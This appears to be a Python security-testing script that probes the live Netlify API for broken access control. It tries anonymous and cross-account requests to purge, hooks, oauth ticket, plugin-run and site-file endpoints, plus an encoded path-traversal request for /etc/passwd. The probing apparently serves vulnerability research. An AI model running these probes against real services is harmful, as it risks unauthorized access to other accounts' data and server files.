# -*- coding: utf-8 -*-
"""写端点与特殊变异点探测(无副作用优先): purge/hooks/oauth-tickets/plugin_runs/files 跨账号
"""
import http.client, ssl, gzip, brotli, json, sys, random
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import TOKEN_A, TOKEN_B, SITE_A

SITE_B = 'd2977de0-d24d-4544-81cb-933e610cad7d'
DID = '6a97c9e3083c963fd210b895'
ctx = ssl.create_default_context()

def req(method, path, body=None, token=None, timeout=25):
    conn = http.client.HTTPSConnection('api.netlify.com', context=ctx, timeout=timeout)
    h = {'User-Agent': 'Mozilla/5.0 Chrome/126.0', 'Accept-Encoding': 'br, gzip',
         'Accept': 'application/json', 'Content-Type': 'application/json'}
    if token: h['Authorization'] = 'Bearer ' + token
    b = json.dumps(body).encode() if body is not None else None
    conn.request(method, path, body=b, headers=h)
    r = conn.getresponse()
    raw = r.read()
    enc = r.getheader('Content-Encoding')
    if enc == 'br': raw = brotli.decompress(raw)
    elif enc == 'gzip': raw = gzip.decompress(raw)
    st = r.status
    txt = raw.decode('utf-8', 'ignore')
    conn.close()
    return st, txt

def probe(tag, m, p, body=None, tok=None):
    st, b = req(m, p, body, tok)
    print('%-52s %s | %s' % (tag, st, b[:140].replace('\n', ' ')))
    return st, b

print('== 1. POST /purge ==')
probe('purge 匿名', 'POST', '/api/v1/purge', {}, None)
probe('purge A token', 'POST', '/api/v1/purge', {}, TOKEN_A)

print()
print('== 2. POST /hooks(旧集成 hook)==')
probe('hooks POST 空body A', 'POST', '/api/v1/hooks', {}, TOKEN_A)
probe('hooks POST 空body anon', 'POST', '/api/v1/hooks', {}, None)

print()
print('== 3. oauth tickets ==')
probe('tickets POST 空body A', 'POST', '/api/v1/oauth/tickets', {}, TOKEN_A)
probe('tickets POST 空body anon', 'POST', '/api/v1/oauth/tickets', {}, None)

print()
print('== 4. plugin_runs ==')
probe('plugin_runs/latest A(packages=[])', 'GET',
      '/api/v1/sites/%s/plugin_runs/latest?packages=[]' % SITE_A, None, TOKEN_A)
probe('plugin_runs/latest B 读 A', 'GET',
      '/api/v1/sites/%s/plugin_runs/latest?packages=[]' % SITE_A, None, TOKEN_B)
probe('deploy plugin_runs POST A 空', 'POST', '/api/v1/deploys/%s/plugin_runs' % DID, {}, TOKEN_A)
probe('deploy plugin_runs POST B', 'POST', '/api/v1/deploys/%s/plugin_runs' % DID, {}, TOKEN_B)

print()
print('== 5. files 跨账号 + 路径语义 ==')
probe('A GET own files list', 'GET', '/api/v1/sites/%s/files' % SITE_A, None, TOKEN_A)
probe('B GET A files list', 'GET', '/api/v1/sites/%s/files' % SITE_A, None, TOKEN_B)
probe('B GET A files /index.html', 'GET', '/api/v1/sites/%s/files/index.html' % SITE_A, None, TOKEN_B)
probe('A GET own files /index.html', 'GET', '/api/v1/sites/%s/files/index.html' % SITE_A, None, TOKEN_A)
probe('A GET own files ../ 穿越', 'GET',
      '/api/v1/sites/%s/files/..%%2F..%%2Fetc%%2Fpasswd' % SITE_A, None, TOKEN_A)
probe('anon GET A files', 'GET', '/api/v1/sites/%s/files' % SITE_A, None, None)
print('done')
